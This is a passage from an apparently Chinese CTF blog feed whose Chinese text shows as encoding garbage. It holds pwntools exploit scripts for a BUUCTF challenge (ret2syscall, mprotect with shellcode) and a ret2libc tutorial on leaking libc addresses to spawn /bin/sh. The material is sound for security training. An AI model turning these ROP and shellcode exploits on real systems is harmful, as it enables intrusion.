class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>write_addr = <span class="hljs-number">0x806E270</span><br>flag_addr = <span class="hljs-number">0x080ECA2D</span><br>target = <span class="hljs-number">0x080489A0</span><br>exit_addr = <span class="hljs-number">0x0804E660</span><br><br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(target)<br>payload += p32(elf.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]) + p32(exit_addr)<br>payload += p32(<span class="hljs-number">1</span>) + p32(flag_addr) + p32(<span class="hljs-number">42</span>)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>æˆ‘ä»¬å‰é¢åˆ†æè¿™ä¸ªæ˜¯é™æ€ç¼–è¯‘ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ret2syscallï¼Œé€šè¿‡è®¾ç½®å¯„å­˜å™¨çš„å€¼ï¼Œç›´æ¥è·å¾—shell</strong></p><h2 id="æ–¹æ³•äºŒ-ret2syscall"><a href="#æ–¹æ³•äºŒ-ret2syscall" class="headerlink" title="æ–¹æ³•äºŒ ret2syscall"></a>æ–¹æ³•äºŒ ret2syscall</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br><span class="hljs-comment">#gdb.attach(p , &#x27;b * 0x080489EA&#x27;)</span><br><span class="hljs-comment">#0x08048b0b : pop eax ; ret</span><br>pop_eax = <span class="hljs-number">0x08048b0b</span><br><span class="hljs-comment">#0x0806fcc9 : pop ebx ; pop edx ; ret</span><br>pop_ebx_edx = <span class="hljs-number">0x0806fcc9</span><br><span class="hljs-comment">#0x0806fcf1 : pop ecx ; pop ebx ; ret</span><br>pop_ecx_ebx = <span class="hljs-number">0x0806fcf1</span><br><span class="hljs-comment">#0x0806d8a5 : int 0x80</span><br>int80_addr = <span class="hljs-number">0x0806d8a5</span><br>get_addr = <span class="hljs-number">0x0804F8D0</span><br>data_addr = <span class="hljs-number">0x080EBAD2</span><br>target = <span class="hljs-number">0x080489A0</span><br><span class="hljs-comment">#0x080481ad : pop ebx ; ret</span><br>pop1 = <span class="hljs-number">0x080481ad</span> <br>payload = <span class="hljs-number">45</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(get_addr) + p32(pop1) + p32(data_addr)<br>payload += p32(pop_ecx_ebx) + p32(<span class="hljs-number">0</span>) + p32(<span class="hljs-number">0</span>)<br>payload += p32(pop_eax) + p32(<span class="hljs-number">11</span>)<br>payload += p32(pop_ebx_edx) + p32(data_addr) + p32(<span class="hljs-number">0</span>)<br>payload += p32(int80_addr)<br>payload += p32(target)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><blockquote><p>è¿™ä¸ªçœ‹ä¸Šå»æœ‰ç‚¹å¤æ‚ä½†æ˜¯ï¼Œè€å¿ƒçœ‹ä¸‹æ¥è¿˜æ˜¯å¾ˆå¥½ç†è§£çš„ï¼Œ32ä½getshelléœ€è¦è°ƒç”¨execv&gt;ï¼ˆâ€&#x2F;bin&#x2F;shâ€,null,null)ï¼Œå¯„å­˜å™¨eax&#x3D;11ï¼Œebx&#x3D;â€&#x2F;bin&#x2F;shâ€ï¼Œecx&#x3D;0ï¼Œedx&#x3D;0ï¼Œç„¶åå†æ‰§è¡Œint 0x80</p></blockquote><p><strong>ç„¶åæˆ‘ä»¬å‘ç°å‡½æ•°åˆ—è¡¨æœ‰mprotect,è¿™ä¸ªå‡½æ•°å¯ä»¥æ”¹å˜æ®µçš„æ‰§è¡Œæƒé™,æˆ‘ä»¬å¯ä»¥å¼€å¯æœ€é«˜æƒé™,æ‰§è¡Œshellcode</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182334572.png"></p><h2 id="æ–¹æ³•ä¸‰-mprotecté…åˆshellcode"><a href="#æ–¹æ³•ä¸‰-mprotecté…åˆshellcode" class="headerlink" title="æ–¹æ³•ä¸‰ mprotecté…åˆshellcode"></a>æ–¹æ³•ä¸‰ mprotecté…åˆshellcode</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>filename = <span class="hljs-string">&#x27;./not_the_same_3dsctf_2016&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt; <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;remote&#x27;</span>:<br>    p = remote(<span class="hljs-string">&#x27;node5.buuoj.cn&#x27;</span> , <span class="hljs-number">29232</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(filename)<br>elf = ELF(filename)<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span> , os = <span class="hljs-string">&#x27;linux&#x27;</span> , log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>mprotect_addr = <span class="hljs-number">0x0806ED40</span><br>pop3_ret = <span class="hljs-number">0x806fcc8</span><br>shellcode = asm(shellcraft.sh())<br>target = <span class="hljs-number">0x80ea000</span><br>binsh_addr = <span class="hljs-number">0x80ec000</span><br><br>payload =  <span class="hljs-number">0x2D</span> * <span class="hljs-string">b&#x27;a&#x27;</span><br>payload += p32(mprotect_addr) + p32(pop3_ret)<br>payload += p32(target) + p32(<span class="hljs-number">0x3000</span>) + p32(<span class="hljs-number">0x7</span>)<br>payload += p32(read_addr) + p32(pop3_ret)<br>payload += p32(<span class="hljs-number">0</span>) + p32(binsh_addr) + p32(<span class="hljs-built_in">len</span>(shellcode))<br>payload += p32(binsh_addr)<br><br>p.sendline(payload)<br>p.sendline(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>BUUCTFåˆ·é¢˜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>mprotect</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç”¨åŠ¨æ€é“¾æ¥åŠ¨æ€æ³„éœ²systemåœ°å€å¹¶åˆ©ç”¨</title>
    <link href="/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/"/>
    <url>/2024/07/18/%E7%94%A8%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%8A%A8%E6%80%81%E6%B3%84%E9%9C%B2system%E5%9C%B0%E5%9D%80%E5%B9%B6%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="å·²çŸ¥libcåº“çš„æƒ…å†µ"><a href="#å·²çŸ¥libcåº“çš„æƒ…å†µ" class="headerlink" title="å·²çŸ¥libcåº“çš„æƒ…å†µ"></a>å·²çŸ¥libcåº“çš„æƒ…å†µ</h2><p><strong>åœ¨åŠ¨æ€ç¼–è¯‘çš„ç¨‹åºä¸­ï¼Œå¦‚æœæ²¡æœ‰å¯¹systemå‡½æ•°çš„ç›´æ¥è°ƒç”¨ï¼Œåœ¨pltä¸­å°±ä¸ä¼šå­˜åœ¨systemå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸èƒ½ç›´æ¥çŸ¥é“systemå‡½æ•°çš„åœ°å€</strong><br><strong>åœ¨è§£å†³åŠ¨æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹‹å‰ï¼Œéœ€è¦äº†è§£åŠ¨æ€é“¾æ¥çš„åŸºç¡€çŸ¥è¯†ï¼Œè¿™ä¸ªè¿‡ç¨‹å«ä½œlzy-bindingã€‚ç¨‹åºå¯¹å¤–éƒ¨å‡½æ•°çš„è°ƒç”¨è¦æ±‚åœ¨ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶å°†å¤–éƒ¨å‡½æ•°é“¾æ¥åˆ°ç¨‹åºä¸­é“¾æ¥çš„æ–¹å¼åˆ†ä¸ºé™æ€é“¾æ¥å’ŒåŠ¨æ€é“¾æ¥ã€‚é™æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶åŒ…å«å¤–éƒ¨å‡½æ•°çš„å…¨éƒ¨ä»£ç ã€‚åŠ¨æ€é“¾æ¥å¾—åˆ°çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸åŒ…å«å¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œè€Œæ˜¯åœ¨è¿è¡Œæ—¶å°†åŠ¨æ€é“¾æ¥åº“(è‹¥å¹²å¤–éƒ¨å‡½æ•°çš„é›†åˆ)åŠ è½½åˆ°å†…å­˜çš„æŸä¸ªä½ç½®ï¼Œåœ¨å‘ç”Ÿè°ƒç”¨æ—¶å†å»é“¾æ¥åº“å®šä½æ‰€éœ€çš„å‡½æ•°ã€‚</strong></p><p><strong>è¿™é‡Œé€šè¿‡å‡ ä¸ªç®€å•çš„æ¦‚å¿µå’Œè¿‡ç¨‹çš„åˆ†ææ¥è¯´æ˜æ•´ä¸ªè¿‡ç¨‹ã€‚</strong></p><ol><li><strong>GOTã€‚GOTæ˜¯å…¨å±€åç§»é‡è¡¨(Global0fset Table)ï¼Œç”¨äºå­˜å‚¨å¤–éƒ¨å‡½æ•°åœ¨å†…å­˜ä¸­çš„ç¡®åˆ‡åœ°å€ã€‚GOTå­˜å‚¨åœ¨æ•°æ®æ®µ(DataSegment)å†…ï¼Œå¯ä»¥åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­è¢«ä¿®æ”¹ã€‚</strong></li><li><strong>PITæ˜¯ç¨‹åºé“¾æ¥è¡¨(Procedure Linkage Table)ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„äººå£ç‚¹(entry),æ¢è¨€ä¹‹ï¼Œç¨‹åºä¼šåˆ° PLT ä¸­å¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µ(CodeSegment)å†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ç›®ä¸ä¼šè¢«ä¿®æ”¹ã€‚</strong></li></ol><p><strong>ç®€å•æ¥è®²ï¼ŒGOTæ˜¯ä¸ªæ•°æ®è¡¨ï¼Œå­˜å‚¨çš„æ˜¯å¤–éƒ¨å‡½æ•°çš„åœ°å€ï¼Œå…·æœ‰è¯»å†™æƒé™(åœ¨FULLRELRO ä¿æŠ¤æœºåˆ¶å¼€å¯çš„æ—¶å€™ï¼Œæ²¡æœ‰è¯»å†™æƒé™):PLTæ˜¯å¤–éƒ¨å‡½æ•°çš„äººå£è¡¨ï¼Œå­˜å‚¨çš„æ˜¯æ¯ä¸ªå¤–éƒ¨å‡½æ•°çš„ä»£ç ï¼Œå…·æœ‰æ‰§è¡Œæƒé™</strong></p><p><strong>å½“ç¨‹åºåœ¨ç¬¬ä¸€æ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œä¼šè¿›å…¥å·²è¢«è½¬è½½è¿›å†…å­˜ä¸­çš„åŠ¨æ€é“¾æ¥åº“ä¸­æŸ¥æ‰¾å¯¹åº”çš„å‡½æ•°å’Œåœ°å€ï¼Œå¹¶æŠŠå‡½æ•°çš„åœ°å€æ”¾åˆ°gotè¡¨ä¸­ï¼Œå°†gotè¡¨çš„åœ°å€æ•°æ®æ˜ å°„ä¸ºpltè¡¨çš„è¡¨é¡¹ï¼›åœ¨ç¨‹åºäºŒæ¬¡è¿è¡Œçš„æ—¶å€™ï¼Œå°±ä¸ç”¨å†é‡æ–°æŸ¥æ‰¾å‡½æ•°åœ°å€ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡pltè¡¨æ‰¾åˆ°gotè¡¨ä¸­å‡½æ•°çš„åœ°å€ï¼Œä»è€Œæ‰§è¡Œå‡½æ•°çš„åŠŸèƒ½äº†ã€‚</strong><br><strong>åœ¨é¦–æ¬¡è°ƒç”¨å¯¼å‡ºå‡½æ•°æ—¶ï¼Œç”±äºæœªçŸ¥å‡½æ•°çœŸæ­£åœ°å€ï¼ˆè¿™æ—¶è¡¨ç°ä¸ºxxx@pltï¼‰ï¼Œå»è®¿é—®pltè¡¨ä¸­è¯¥å‡½æ•°æ‰€åœ¨çš„é¡¹ï¼ˆä¸ºä¸€æ®µä»£ç ï¼Œä¸‰æ¡æŒ‡ä»¤å¦‚ä¸Šå›¾æ‰€ç¤ºï¼‰ï¼Œä¹‹åå»è®¿é—®GOTè¡¨ï¼Œåˆè·³åˆ°PLT[0]çš„ä¸­ï¼ˆä»£ç æ®µï¼‰è°ƒç”¨å‡½æ•°_dl_runtime_resolveå»è·å–çœŸæ­£çš„å‡½æ•°åœ°å€å¹¶ä¿®æ”¹å¯¹åº”çš„GOTè¡¨é¡¹</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348465.png"><br><strong>è¿˜æœ‰å‡ ç‚¹éœ€è¦æ³¨æ„</strong></p><ol><li><strong>GOT[0] æ˜¯.dynamicæ®µçš„è£…è½½åœ°å€ï¼Œ.dynamicæ®µåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨ç”¨æ¥ç»‘å®šè¿‡ç¨‹åœ°å€çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·çš„ä½ç½®å’Œé‡å®šä½ä¿¡æ¯;</strong></li><li><strong>GOT[1] æ˜¯åŠ¨æ€é“¾æ¥å™¨çš„æ ‡è¯†link_mapçš„åœ°å€;</strong></li><li><strong>GOT[2] åŒ…å«åŠ¨æ€é“¾æ¥å™¨çš„å»¶è¿Ÿç»‘å®šä»£ç _dl_runtime_resolveçš„å…¥å£ç‚¹ï¼Œç”¨äºå¾—åˆ°çœŸæ­£çš„å‡½æ•°åœ°å€ï¼Œå›å†™åˆ°å¯¹åº”çš„gotè¡¨ä¸­;</strong></li><li><strong>ä» GOT[3] å¼€å§‹å°±æ˜¯å‡½æ•°çš„åœ°å€ã€‚</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182348896.png"></li></ol><p><strong>å¯¹äºä»»æ„ä¸¤ä¸ªå‡½æ•°çš„åç§»æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªæ¥åšé¢˜ï¼Œæˆ‘ä»¬éœ€è¦æ³„éœ²ä¸€ä¸ªå‡½æ•°åœ°å€ï¼Œæ ¹æ®åç§»æ¥è®¡ç®—åŸºåœ°å€ï¼Œè¿™æ ·å°±èƒ½å¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„åœ°å€</strong><br><strong>ç”¨ä¸€é“ä¾‹é¢˜æ¥å…·ä½“è¯´æ˜ä¸€ä¸‹</strong><br>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc3">é™„ä»¶ä¸‹è½½</a><br><strong>é¦–å…ˆæŸ¥çœ‹ä¿æŠ¤</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349307.png"><br><strong>åœ°å€éšæœºåŒ–ï¼ŒNXå¼€å¯</strong><br><strong>IDAåç¼–è¯‘ï¼Œæ²¡æœ‰å‘ç°åé—¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è°ƒç”¨åŠ¨æ€é“¾æ¥åº“é‡Œé¢çš„systemæ¥getshell</strong><br><strong>ç¬¬ä¸€æ­¥ï¼šå…ˆæ³„éœ²å‡½æ•°çš„ä¸€ä¸ªåœ°å€</strong><br><strong>æˆ‘ä»¬å‘ç°äº†æ ˆæº¢å‡ºæ¼æ´å’Œputè¾“å‡ºå‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ ¹æ®è¿™ä¸ªå‡½æ•°æ³„éœ²åœ°å€</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349095.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2libc3&quot;)<br>gdb.attach(p,&quot;b *0x0804854C&quot;)<br>elf = ELF(&quot;./ret2libc3&quot;)<br>libc = ELF(&quot;/lib/i386-linux-gnu/libc-2.23.so&quot;)<br><br>gets_got = elf.got[&quot;gets&quot;]<br>puts_plt = elf.plt[&quot;puts&quot;]<br>main_addr = 0x0804854E<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload1 = &quot;a&quot; * 0x108 + p32(1)<br>payload1 += p32(puts_plt) + p32(main_addr) + p32(gets_got)<br>p.sendline(payload1)<br></code></pre></td></tr></table></figure><p><strong>æ ¹æ®EXPæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡è°ƒç”¨putå‡½æ•°æ¥æ‰“å°gotè¡¨ä¸­getsçš„åœ°å€ï¼Œè¿™æ ·getsçš„åœ°å€å°±æ³„éœ²æˆåŠŸäº†</strong><br><strong>ç¬¬äºŒæ­¥:è®¡ç®—åç§»</strong><br><strong>æˆ‘ä»¬æ³„éœ²äº†getså‡½æ•°çš„åœ°å€,é‚£ä¹ˆæ ¹æ®å®ƒçš„åç§»,å°±èƒ½å¾—åˆ°åŸºåœ°å€.base_addr&#x3D; æ³„éœ²åœ°å€ - å‡å»åç§»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs [python]">leak_addr = u32(p.recv(4))<br>libc_base = leak_addr - libc.symbols[&quot;gets&quot;]<br>libc.address = libc_base<br>log.success(&quot;libc_base:&quot; + hex(libc.address))<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œçš„libc.symbosl[â€˜â€™]åœ¨è®¾ç½®åŸºåœ°å€ä¹‹å‰å¾—åˆ°çš„æ˜¯åç§»å€¼,åœ¨è®¾ç½®åŸºåœ°å€ä¹‹åå¾—åˆ°çš„æ˜¯å®é™…åœ°å€å€¼</strong><br><strong>ç¬¬ä¸‰æ­¥:æ”»å‡»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs [python]">system = libc.symbols[&quot;system&quot;] #å¾—åˆ°å®é™…åœ°å€å€¼<br>binsh = libc.search(&quot;/bin/sh&quot;).next() #æœç´¢å­—ç¬¦ä¸²ï¼Œè¿”å›åœ°å€<br>p.recvuntil(&quot;ret2libc3\n&quot;)<br>payload2 = &quot;a&quot; * 0x108 + p32(1)<br>payload2 += p32(system) + p32(1) + p32(binsh)<br>p.sendline(payload2)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><strong>è¿™æ ·ä¸€ä¸ªå·²çŸ¥åŠ¨æ€é“¾æ¥åº“çš„é¢˜å°±å†™å¥½äº†,è¯´åˆ°è¿™è‚¯å®šæƒ³é—®,é‚£è¦æ˜¯æœªçŸ¥å‘¢?åˆ«æ€¥æ¥ç€å¾€ä¸‹çœ‹</strong></p><h2 id="æœªçŸ¥åŠ¨æ€é“¾æ¥åº“"><a href="#æœªçŸ¥åŠ¨æ€é“¾æ¥åº“" class="headerlink" title="æœªçŸ¥åŠ¨æ€é“¾æ¥åº“"></a>æœªçŸ¥åŠ¨æ€é“¾æ¥åº“</h2><p><strong>å¯¹äºæœªçŸ¥åŠ¨æ€é“¾æ¥åº“,åšé¢˜æ–¹å¼å’Œå·²çŸ¥é“¾æ¥åº“æ˜¯å¤§åŒå°å¼‚çš„,æ— éæ˜¯ç¡®å®šlibcåº“æ˜¯ä»€ä¹ˆç‰ˆæœ¬,æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹æ€ä¹ˆç¡®å®š</strong><br><strong>åœ¨æˆ‘ç°åœ¨å­¦ä¹ ä¸­,æœ‰ä¸‰ç§æ–¹æ³•(å®é™…è‚¯å®šä¸æ­¢ä¸‰ç§,ä½¿ç”¨è‡ªå·±è§‰å¾—å¥½ç”¨çš„å°±è¡Œ)</strong></p><ol><li>åœ¨ githubä¸Šæœ‰ä¸ª libc-database é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨é¡¹ç›®ä¸Šçš„æ–¹æ³•æ‰¾å‡ºå¯¹åº”ç‰ˆæœ¬ã€‚</li><li>åœ¨ç½‘ç«™ <a href="https://libc.nullbyte.cat/">https://libc.nullbyte.cat/</a> ä¸Šè¾“å…¥å¯¹åº”çš„å‡½æ•°åå’Œåœ°å€æ‰¾åˆ° 1ibc ç‰ˆæœ¬ã€‚</li><li>ä½¿ç”¨pythonåº“libcsearcher</li></ol><p><strong>è¿™é‡Œæˆ‘ä»¬è¯´ä¸€ä¸‹ç¬¬ä¸‰ç§</strong></p><ol><li><strong>å®‰è£…</strong> <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/lieanu/LibcSearcher.git<br><span class="hljs-keyword">cd</span> LibcSearcher<br><span class="hljs-keyword">python</span> setup.<span class="hljs-keyword">py</span> develop<br></code></pre></td></tr></table></figure></li><li><strong>åŸºæœ¬ä½¿ç”¨</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs [python]">libc = LibcSearcher(&quot;func&quot;,gets_real_addr)             #å¯»æ‰¾åŒ¹é…çš„libcç‰ˆæœ¬<br>libcbase = gets_real_addr â€“ obj.dump(&quot;func&quot;)            #ç¡®å®šåŸºåœ°å€<br>system_addr = libcbase + obj.dump(&quot;system&quot;)            #system åç§»<br>bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh åç§»<br><br><br></code></pre></td></tr></table></figure>ä¾‹é¢˜ï¼š<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc">https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2libc</a><br><strong>æ™®é€šæ ˆæº¢å‡º</strong><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182349927.png"><br><strong>è¿™é‡Œè·ç¦»æ ˆåº•ä¸º0x14ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æŒ‰ç…§14ä¸ªå­—èŠ‚ç¼–å†™ä¼šæŠ¥é”™ï¼Œæˆ‘ä»¬ä½¿ç”¨cyclicçš„æ–¹æ³•åˆ¤æ–­æº¢å‡ºï¼Œå‘ç°è·ç¦»æ ˆåº•ä¸º0x1cä¸ªå­—èŠ‚</strong><br><strong>ç›´æ¥ä¸Šè„šæœ¬</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br>from LibcSearcher import *<br>ret2libc = ELF(&#x27;./1&#x27;)<br>p = process(&#x27;./1&#x27;)<br>p.recvuntil(&#x27;is&#x27;)<br>binsh_addr = int(p.recvuntil(&#x27;\n&#x27; , drop=True) , 16)<br>p.recvuntil(&#x27;is&#x27;)<br>puts_addr = int(p.recvuntil(&#x27;\n&#x27; , drop = True) , 16)<br>libc = LibcSearcher(&#x27;puts&#x27; , puts_addr)<br>base_addr = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = base_addr + libc.dump(&#x27;system&#x27;)<br>payload = 32 * b&#x27;a&#x27;  + p32(system_addr) + p32(1) + p32(binsh_addr)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><strong>åšå¥½ä½¿ç”¨python3è¿è¡Œï¼Œåˆ«é—®æˆ‘æ€ä¹ˆçŸ¥é“çš„~~~~</strong></li></ol>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ ˆ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç¼–å†™å¤šä¸ªå‡½æ•°çš„ROPé“¾</title>
    <link href="/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/"/>
    <url>/2024/07/18/%E7%BC%96%E5%86%99%E5%A4%9A%E4%B8%AA%E5%87%BD%E6%95%B0%E7%9A%84ROP%E9%93%BE/</url>
    
